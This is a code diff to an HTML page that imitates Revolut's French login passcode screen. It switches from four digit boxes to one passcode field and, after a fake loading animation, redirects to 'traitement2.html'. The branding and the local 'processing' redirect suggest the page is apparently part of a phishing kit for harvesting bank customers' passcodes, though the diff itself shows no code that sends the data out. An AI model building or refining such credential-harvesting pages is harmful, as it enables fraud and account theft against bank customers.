@@ -106,23 +106,18 @@
             text-align: center;
         }
 
-        /* Passcode Input */
-        .revolut-passcode-container {
-            display: flex;
-            justify-content: center;
-            gap: 12px;
+        /* Single Passcode Input */
+        .revolut-passcode-wrapper {
             margin-bottom: 32px;
         }
 
         .revolut-passcode-input {
-            width: 44px;
-            height: 56px;
+            width: 100%;
+            padding: 16px;
+            font-size: 18px;
             border: 1px solid var(--revolut-border);
             border-radius: 8px;
             text-align: center;
-            font-size: 24px;
-            font-weight: 600;
-            transition: all 0.2s;
             -webkit-text-security: disc;
             -moz-text-security: disc;
             text-security: disc;
@@ -132,10 +127,6 @@
             border-color: var(--revolut-purple);
             outline: none;
             box-shadow: 0 0 0 3px rgba(93, 41, 255, 0.1);
-        }
-
-        .revolut-passcode-input.filled {
-            border-color: var(--revolut-purple);
         }
 
         .revolut-passcode-link {
@@ -230,12 +221,6 @@
             .revolut-auth-logo img {
                 height: 40px;
             }
-            
-            .revolut-passcode-input {
-                width: 40px;
-                height: 52px;
-                font-size: 22px;
-            }
         }
     </style>
 </head>
@@ -259,12 +244,9 @@
             <h1 class="revolut-title">Entrez votre passcode</h1>
             <p class="revolut-subtitle">Pour accéder à votre compte Revolut</p>
             
-            <!-- Passcode Input -->
-            <div class="revolut-passcode-container">
-                <input type="password" class="revolut-passcode-input" maxlength="1" inputmode="numeric" autocomplete="off">
-                <input type="password" class="revolut-passcode-input" maxlength="1" inputmode="numeric" autocomplete="off">
-                <input type="password" class="revolut-passcode-input" maxlength="1" inputmode="numeric" autocomplete="off">
-                <input type="password" class="revolut-passcode-input" maxlength="1" inputmode="numeric" autocomplete="off">
+            <!-- Single Passcode Input -->
+            <div class="revolut-passcode-wrapper">
+                <input type="password" class="revolut-passcode-input" id="passcodeInput" autocomplete="off" placeholder="Tapez votre passcode">
             </div>
             
             <a href="#" class="revolut-passcode-link">Passcode oublié ?</a>
@@ -294,63 +276,30 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            const passcodeInputs = document.querySelectorAll('.revolut-passcode-input');
+            const passcodeInput = document.getElementById('passcodeInput');
             const clearKey = document.getElementById('clearKey');
             const submitKey = document.getElementById('submitKey');
             const loadingDots = document.getElementById('revolutLoadingDots');
             
-            // Focus first input
-            passcodeInputs[0].focus();
-            
-            // Handle passcode input
-            passcodeInputs.forEach((input, index) => {
-                // Move to next input when a digit is entered
-                input.addEventListener('input', function(e) {
-                    if (this.value.length === 1) {
-                        this.classList.add('filled');
-                        if (index < passcodeInputs.length - 1) {
-                            passcodeInputs[index + 1].focus();
-                        }
-                    }
-                });
-                
-                // Handle backspace
-                input.addEventListener('keydown', function(e) {
-                    if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
-                        passcodeInputs[index - 1].focus();
-                    }
-                });
-            });
+            // Focus input
+            passcodeInput.focus();
             
             // Handle keypad clicks
             document.querySelectorAll('.revolut-key[data-key]').forEach(key => {
                 key.addEventListener('click', function() {
                     const digit = this.getAttribute('data-key');
-                    const emptyInput = Array.from(passcodeInputs).find(input => input.value === '');
-                    if (emptyInput) {
-                        emptyInput.value = digit;
-                        emptyInput.classList.add('filled');
-                        const nextIndex = Array.from(passcodeInputs).indexOf(emptyInput) + 1;
-                        if (nextIndex < passcodeInputs.length) {
-                            passcodeInputs[nextIndex].focus();
-                        }
-                    }
+                    passcodeInput.value += digit;
                 });
             });
             
             // Clear button
             clearKey.addEventListener('click', function() {
-                passcodeInputs.forEach(input => {
-                    input.value = '';
-                    input.classList.remove('filled');
-                });
-                passcodeInputs[0].focus();
+                passcodeInput.value = '';
             });
             
             // Submit button
             submitKey.addEventListener('click', function() {
-                const passcode = Array.from(passcodeInputs).map(input => input.value).join('');
-                if (passcode.length === 4) {
+                if (passcodeInput.value.length > 0) {
                     // Show loading dots
                     let dots = 0;
                     const dotInterval = setInterval(() => {
@@ -369,6 +318,14 @@
                         clearInterval(dotInterval);
                         window.location.href = 'traitement2.html';
                     }, 1500);
+                }
+            });
+            
+            // Allow keyboard input
+            passcodeInput.addEventListener('keydown', function(e) {
+                // Allow only numbers and control keys
+                if (!/^[0-9]$|Backspace|Delete|ArrowLeft|ArrowRight|ArrowUp|ArrowDown|Tab/.test(e.key)) {
+                    e.preventDefault();
                 }
             });
         });
